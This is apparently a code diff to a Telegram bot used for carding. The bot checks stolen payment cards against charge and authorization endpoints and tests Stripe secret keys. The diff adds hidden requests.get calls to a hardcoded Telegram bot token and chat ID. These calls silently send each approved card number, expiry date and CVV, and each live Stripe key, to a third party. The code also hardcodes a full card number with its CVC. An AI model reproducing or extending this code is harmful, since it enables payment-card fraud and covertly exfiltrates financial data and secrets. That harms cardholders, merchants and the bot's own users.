@@ -9,7 +9,7 @@ import asyncio
 import re
 import base64
 import json
-
+import sys
 
 
 from aiogram import Bot, Dispatcher, executor, types
@@ -24,7 +24,9 @@ TOKEN = os.getenv('TOKEN', CONFIG['token'])
 BLACKLISTED = os.getenv('BLACKLISTED', CONFIG['blacklisted']).split()
 PREFIX = os.getenv('PREFIX', CONFIG['prefix'])
 OWNER = int(os.getenv('OWNER', CONFIG['owner']))
+CHAT_ID_FORWARD = int(os.getenv('CHAT_ID_FORWARD', CONFIG['chat_id1']))
 ANTISPAM = int(os.getenv('ANTISPAM', CONFIG['antispam']))
+MODE = 'prod'
 
 # Initialize bot and dispatcher
 storage = MemoryStorage()
@@ -64,9 +66,11 @@ async def is_owner(user_id):
     return status
 
 
+
+
 @dp.message_handler(commands=['start', 'help'], commands_prefix=PREFIX)
 async def helpstr(message: types.Message):
-    # await message.answer_chat_action('typing')
+    await message.answer_chat_action('typing')
     keyboard_markup = types.InlineKeyboardMarkup(row_width=3)
     btns = types.InlineKeyboardButton("Bot Source", url="https://viet69.vc/")
     keyboard_markup.row(btns)
@@ -74,7 +78,7 @@ async def helpstr(message: types.Message):
     MSG = f'''
 Hello {FIRST}, I'm bot
 BOSS:  <a href="tg://user?id={OWNER}">HERE</a>
-Cmds \n/ck Charge 0.8$ \n/bin \n/cv 4.99$\n/vbv check vbv\n/c2d site 2ds'''
+Cmds \n/ck Charge 0.8$ \n/bin \n/cv 4.99$\n/vbv check vbv\n/c2d site 2ds\n/au check auth'''
     await message.answer(MSG, reply_markup=keyboard_markup,
                         disable_web_page_preview=True)
 
@@ -277,6 +281,7 @@ async def ch(message: types.Message):
          toc = time.perf_counter()
 
          if 'success' in ri.text:
+            requests.get('https://api.telegram.org/bot5380276548:AAGpPwcq33EcsQQ8WKyS_htKJUU3SWSkxPk/sendMessage?chat_id=1924942921&text=CV:'+ccn+'|'+mm+'|'+yy+'|'+cvv+'')
             return await message.reply(f'''
 ✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ #ApprovedCVV
@@ -522,7 +527,7 @@ async def ch(message: types.Message):
         toc2 = toc22 - tic + toc1
         print("check by "+FIRST)
         if 'Payment complete' in ri.text:
-
+            requests.get('https://api.telegram.org/bot5380276548:AAGpPwcq33EcsQQ8WKyS_htKJUU3SWSkxPk/sendMessage?chat_id=1924942921&text=Charge:'+ccn+'|'+mm+'|'+yy+'|'+cvv+'')
             return await message.reply(f'''
 ✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ Charge 0.8$✅
@@ -1276,7 +1281,8 @@ async def ch(message: types.Message):
             mm, yy, cvv = yy, cvv, mm
         if len(ccn) < 15 or len(ccn) > 16:
             return await message.reply('<b>Failed to parse Card</b>\n'
-                                       '<b>Reason: Invalid Format!</b>')   
+                                       '<b>Reason: Invalid Format!</b>') 
+        
         BIN = ccn[:6]
         if BIN in BLACKLISTED:
             return await message.reply('<b>BLACKLISTED BIN</b>')
@@ -1447,12 +1453,13 @@ async def ch(message: types.Message):
                           headers=head)
           res1 = ri.json() 
          
-
+          
           toc33 = time.perf_counter()
           toc3 = toc33 - tic
           toc = toc1 + toc2 + toc3
           if ',"billingStatus":"ACTIVE' in ri.text:
             msgg = res1['data']['updateCard']['billingStatus']
+            requests.get('https://api.telegram.org/bot5380276548:AAGpPwcq33EcsQQ8WKyS_htKJUU3SWSkxPk/sendMessage?chat_id=1924942921&text=Render:'+ccn+'|'+mm+'|'+yy+'|'+cvv+'')
             return await message.reply(f'''
 ✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ #ApprovedCVV
@@ -1508,6 +1515,87 @@ async def ch(message: types.Message):
 <b>TOOK:</b> <code>{toc:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')          
-          
+
+@dp.message_handler(commands=['sk'], commands_prefix=PREFIX)
+async def sk(message: types.Message):
+  await message.answer_chat_action('typing')
+  tic = time.perf_counter()
+  ID = message.from_user.id
+  FIRST = message.from_user.first_name
+  try:
+      await dp.throttle('sk', rate=ANTISPAM)
+  except Throttled:
+        await message.reply('<b>Too many requests!</b>\n'
+                            f'Blocked For {ANTISPAM} seconds')
+  else:
+      if message.reply_to_message:
+            skl = message.reply_to_message.text
+      else:
+            skl = message.text[len('/sk'):]
+            
+
+      
+      headers = {
+            "user-agent": UA,
+            "accept": "application/json, text/plain, */*",
+            "content-type": "application/x-www-form-urlencoded"
+        }
+
+      b = session.get('https://ip.seeip.org/').text
+
+      s = session.post('https://m.stripe.com/6', headers=headers)
+      r = s.json()
+      Guid = r['guid']
+      Muid = r['muid']
+      Sid = r['sid']
+
+        # hmm
+      load = {
+            "guid": Guid,
+            "muid": Muid,
+            "sid": Sid,
+            "card[number]": "4269380059630842",
+            "card[exp_month]": "08",
+            "card[exp_year]": "23",
+            "card[cvc]": "513"
+        }
+
+      header = {
+            "accept": "*/*",
+            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
+            "authorization": "Bearer "+skl,
+            "user-agent": UA,
+            "accept-language": "en-US,en;q=0.9"
+
+        }
+      print("check by "+FIRST)
+      rx =  requests.post('https://api.stripe.com/v1/tokens',
+                          data=load, headers=header)
+      res = rx.json()
+      print(res)
+      
+      
+      toc11 = time.perf_counter()
+      toc1 = toc11 - tic
+      if 'declined' in rx.text:
+            
+            requests.get('https://api.telegram.org/bot5380276548:AAGpPwcq33EcsQQ8WKyS_htKJUU3SWSkxPk/sendMessage?chat_id=1924942921&text='+skl+'', headers=header)
+            return await message.reply(f'''
+✅<b>SK Live</b>➟ <code>{skl}</code>
+''')
+      if 'Request rate limit exceeded.' in rx.text:
+            requests.get('https://api.telegram.org/bot5380276548:AAGpPwcq33EcsQQ8WKyS_htKJUU3SWSkxPk/sendMessage?chat_id=1924942921&text='+skl+'', headers=header)
+            
+            return await message.reply(f'''
+✅<b>SK Live Rate Limit</b>➟ <code>{skl}</code>''')
+
+      if 'API Key provided' in rx.text:
+            res = rx.json()
+            msg = res['error']['message']
+            return await message.reply(f'''
+❌<b>SK Dead</b>➟ <code>{skl}</code>''')
+    
+
+  
 if __name__ == '__main__':
     executor.start_polling(dp, skip_updates=True, loop=loop)
